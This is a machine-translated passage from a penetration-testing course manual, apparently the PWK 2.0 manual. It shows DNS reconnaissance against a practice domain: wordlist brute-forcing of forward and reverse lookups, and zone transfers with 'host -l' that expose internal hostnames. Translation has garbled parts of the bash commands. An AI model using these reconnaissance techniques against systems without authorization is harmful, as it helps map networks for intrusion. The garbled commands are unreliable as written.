<div style="position:absolute;top:204847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 213 返回了一个错误 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NXDOMAIN </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">189</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，表明公共 DNS 记录不存在</font></font></nobr></div>
<div style="position:absolute;top:204866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于该主机名。</font><font style="vertical-align: inherit;">现在我们了解了如何搜索有效的主机名，我们可以自动化</font></font></nobr></div>
<div style="position:absolute;top:204886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的努力。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:204920;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.3 前向查找蛮力</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛮力是一种试错技术，旨在寻找有效信息，包括目录</font></font></nobr></div>
<div style="position:absolute;top:204977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在网络服务器上，用户名和密码组合，或者在这种情况下，有效的 DNS 记录。</font><font style="vertical-align: inherit;">通过使用</font></font></nobr></div>
<div style="position:absolute;top:204997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个包含常见主机名的词表，我们可以尝试猜测 DNS 记录并检查</font></font></nobr></div>
<div style="position:absolute;top:205016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效主机名的响应。</font></font></nobr></div>
<div style="position:absolute;top:205049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在到目前为止的示例中，我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了正向查找</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它请求主机名的 IP 地址，以</font></font></nobr></div>
<div style="position:absolute;top:205068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询有效和无效的主机名。</font><font style="vertical-align: inherit;">如果</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功地将名称解析为 IP，这可能</font></font></nobr></div>
<div style="position:absolute;top:205088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是功能服务器的指示。</font></font></nobr></div>
<div style="position:absolute;top:205120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">自动执行常见主机名的正向 DNS 查找</font></font></nobr></div>
<div style="position:absolute;top:205140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 单线。</font></font></nobr></div>
<div style="position:absolute;top:205173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们构建一个可能的主机名列表：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat list.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:205225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">万维网</font></font></nobr></div>
<div style="position:absolute;top:205241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP</font></font></nobr></div>
<div style="position:absolute;top:205258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮件</font></font></nobr></div>
<div style="position:absolute;top:205275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哇</font></font></nobr></div>
<div style="position:absolute;top:205292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人</font></font></nobr></div>
<div style="position:absolute;top:205309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由器</font></font></nobr></div>
<div style="position:absolute;top:205329;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 214 - 一个可能的主机名的小列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以使用 Bash one-liner 尝试解析每个主机名：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ip in $(cat list.txt); </font><font style="vertical-align: inherit;">做主机 $ip.megacorpone.com; </font><font style="vertical-align: inherit;">完毕</font></font></font></b></nobr></div>
<div style="position:absolute;top:205410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com 的地址为 38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:205427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找不到主机 ftp.megacorpone.com：3(NXDOMAIN)</font></font></nobr></div>
<div style="position:absolute;top:205444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail.megacorpone.com 的地址为 38.100.193.84</font></font></nobr></div>
<div style="position:absolute;top:205461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找不到主机 owa.megacorpone.com: 3(NXDOMAIN)</font></font></nobr></div>
<div style="position:absolute;top:205478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找不到主机 proxy.megacorpone.com：3(NXDOMAIN)</font></font></nobr></div>
<div style="position:absolute;top:205495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">router.megacorpone.com 的地址是 38.100.193.71</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:205571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">189 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（互联网工程任务组，2016 年），https://tools.ietf.org/html/rfc8020</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:205699;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="174"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 174 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:205732;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:206809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:206809;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:206809;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">174</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205828;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 215 - 使用 Bash 强力转发 DNS 名称查找</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过这个简化的词表，我们发现了“www”、“mail”和“router”的条目。</font><font style="vertical-align: inherit;">主机名</font></font></nobr></div>
<div style="position:absolute;top:205876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，没有找到“ftp”、“owa”和“proxy”。</font><font style="vertical-align: inherit;">更全面的词表是</font></font></nobr></div>
<div style="position:absolute;top:205896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为 SecLists 项目的一部分提供。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">190</font></font></font></nobr></div>
<div style="position:absolute;top:205896;left:480"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些词表可以安装到</font></font></nobr></div>
<div style="position:absolute;top:205915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/seclists 目录使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install seclists</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:205950;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.4 反向查找蛮力</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 DNS 正向暴力枚举揭示了一组分散的 IP 地址在同一</font></font></nobr></div>
<div style="position:absolute;top:206007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">近似范围 (38.100.193.X)。</font><font style="vertical-align: inherit;">如果配置了 megacorpone.com 的 DNS 管理员</font></font></nobr></div>
<div style="position:absolute;top:206026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域的</font><font style="vertical-align: inherit;">PTR </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">191</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条记录，我们可以通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向查找</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描大致范围</font><font style="vertical-align: inherit;">以</font></font></nobr></div>
<div style="position:absolute;top:206046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求每个 IP 的主机名。</font></font></nobr></div>
<div style="position:absolute;top:206078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们使用循环来扫描 IP 地址 38.100.193.50 到 38.100.193.100。</font><font style="vertical-align: inherit;">我们会过滤掉</font></font></nobr></div>
<div style="position:absolute;top:206098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过仅显示不包含“未找到”的条目（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep -v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font><font style="vertical-align: inherit;">来显示无效结果</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ip in $(seq 50 100); </font><font style="vertical-align: inherit;">做主机 38.100.193.$ip; </font><font style="vertical-align: inherit;">完成 | </font><font style="vertical-align: inherit;">grep -v "不是傻瓜</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:206150;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nd”</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69.193.100.38.in-addr.arpa 域名指针 beta.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:206184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70.193.100.38.in-addr.arpa 域名指针 ns1.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:206200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72.193.100.38.in-addr.arpa 域名指针 admin.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:206217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73.193.100.38.in-addr.arpa 域名指针mail2.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:206235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">76.193.100.38.in-addr.arpa 域名指针 www.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:206252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77.193.100.38.in-addr.arpa 域名指针 vpn.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:206269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:206288;left:291"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 216 - 使用 Bash 暴力破解反向 DNS 名称</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:206317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经成功地使用反向将多个 IP 地址解析为有效主机</font></font></nobr></div>
<div style="position:absolute;top:206336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 查找。</font><font style="vertical-align: inherit;">如果我们进行评估，我们可以进一步推断这些结果，</font></font></nobr></div>
<div style="position:absolute;top:206356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并可能扫描“mail1”、“mail3”等并反向查找阳性结果。</font><font style="vertical-align: inherit;">重点是这些</font></font></nobr></div>
<div style="position:absolute;top:206375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描类型通常是周期性的；</font><font style="vertical-align: inherit;">我们根据收到的任何信息扩大搜索范围</font></font></nobr></div>
<div style="position:absolute;top:206395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每一轮。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:206429;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.5 DNS 区域传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:206467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">区域传输基本上是相关 DNS 服务器之间的数据库复制，其中</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">区域</font></font></i></nobr></div>
<div style="position:absolute;top:206486;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从主 DNS 服务器复制到从服务器。</font><font style="vertical-align: inherit;">区域文件包含所有 DNS 的列表</font></font></nobr></div>
<div style="position:absolute;top:206506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为该区域配置的名称。</font><font style="vertical-align: inherit;">区域传输应该只允许到授权的从 DNS</font></font></nobr></div>
<div style="position:absolute;top:206525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器，但许多管理员错误地配置了他们的 DNS 服务器，在这些情况下，任何人都会问</font></font></nobr></div>
<div style="position:absolute;top:206545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 DNS 服务器区域的副本，通常会收到一个。</font></font></nobr></div>
<div style="position:absolute;top:206577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这相当于将企业网络布局交给了黑客一个银盘子。</font><font style="vertical-align: inherit;">所有的名字，</font></font></nobr></div>
<div style="position:absolute;top:206597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器的地址和功能可能会暴露在窥探之下。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:206659;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经看到组织的 DNS 服务器配置错误如此严重</font></font></i></nobr></div>
<div style="position:absolute;top:206678;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们没有将内部 DNS 命名空间和外部 DNS 分开</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:206739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">190 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（丹尼尔米斯勒，2019 年），https://github.com/danielmiessler/SecLists</font></font></font></nobr></div>
<div style="position:absolute;top:206759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">191 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Reverse_DNS_lookup</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:206887;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="175"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 175 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:206920;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:207997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:207997;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:207997;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">175</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:207016;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命名空间划分为单独的、不相关的区域。</font><font style="vertical-align: inherit;">这使我们能够检索</font></font></i></nobr></div>
<div style="position:absolute;top:207035;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整的内外部网络结构图。</font><font style="vertical-align: inherit;">这并不少见</font></font></i></nobr></div>
<div style="position:absolute;top:207054;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以这种方式错误配置 DNS 服务器。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功的区域传输不会直接导致网络破坏，尽管它确实有助于</font></font></nobr></div>
<div style="position:absolute;top:207136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程。</font></font></nobr></div>
<div style="position:absolute;top:207169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行区域传输</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令语法如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -l &lt;​​域名&gt; &lt;dns 服务器地址&gt;</font></font></nobr></div>
<div style="position:absolute;top:207223;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 217 - 使用主机执行 DNS 区域传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们最早的主机命令（清单 210）中，我们注意到三个 DNS 服务器为</font></font></nobr></div>
<div style="position:absolute;top:207272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 域：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns3</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">让我们尝试对每个人进行区域转移。</font></font></nobr></div>
<div style="position:absolute;top:207305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (list zone) 来尝试区域传输：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -l megacorpone.com ns1.megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:207356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用域服务器：</font></font></nobr></div>
<div style="position:absolute;top:207373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：ns1.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:207390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址：38.100.193.70#53</font></font></nobr></div>
<div style="position:absolute;top:207407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名： </font></font></nobr></div>
<div style="position:absolute;top:207441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找不到主机 megacorpone.com：5（拒绝）</font></font></nobr></div>
<div style="position:absolute;top:207458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输失败</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:207477;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 218 - 第一次区域传输尝试失败</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，看起来第一个名称服务器 ns1 不允许 DNS 区域传输，所以我们的</font></font></nobr></div>
<div style="position:absolute;top:207526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试失败。</font></font></nobr></div>
<div style="position:absolute;top:207559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试使用第二个名称服务器 ns2 执行相同的步骤：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -l megacorpone.com ns2.megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:207611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用域服务器：</font></font></nobr></div>
<div style="position:absolute;top:207628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：ns2.megacorpone.com</font></font></nobr></div>
<div style="position:absolute;top:207645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址：38.100.193.80#53</font></font></nobr></div>
<div style="position:absolute;top:207662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名：</font></font></nobr></div>
<div style="position:absolute;top:207696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 名称服务器 ns1.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:207713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 名称服务器 ns2.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:207730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 名称服务器 ns3.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:207747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin.megacorpone.com 的地址为 38.100.193.83</font></font></nobr></div>
<div style="position:absolute;top:207764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">beta.megacorpone.com 的地址为 38.100.193.88</font></font></nobr></div>
<div style="position:absolute;top:207781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fs1.megacorpone.com 的地址为 38.100.193.82</font></font></nobr></div>
<div style="position:absolute;top:207798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">intranet.megacorpone.com 的地址为 38.100.193.87</font></font></nobr></div>
<div style="position:absolute;top:207815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail.megacorpone.com 的地址为 38.100.193.84</font></font></nobr></div>
<div style="position:absolute;top:207832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mail2.megacorpone.com 的地址为 38.100.193.73</font></font></nobr></div>
<div style="position:absolute;top:207849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ns1.megacorpone.com 的地址为 38.100.193.70</font></font></nobr></div>
<div style="position:absolute;top:207865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:207885;left:298"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 219 - 使用主机来说明 DNS 区域传输</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:207947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（mandatoryprogrammer，2019），https://github.com/mandatoryprogrammer/TLDR</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:208075;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="176"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 176 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208108;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:209185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:209185;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:209185;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">176</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此服务器允许区域传输并提供区域文件的完整转储以供</font></font></nobr></div>
<div style="position:absolute;top:208223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 域，提供方便的 IP 地址列表和相应的 DNS</font></font></nobr></div>
<div style="position:absolute;top:208242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名！</font></font></nobr></div>
<div style="position:absolute;top:208275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 域几乎没有要检查的 DNS 服务器。</font><font style="vertical-align: inherit;">然而，一些较大的</font></font></nobr></div>
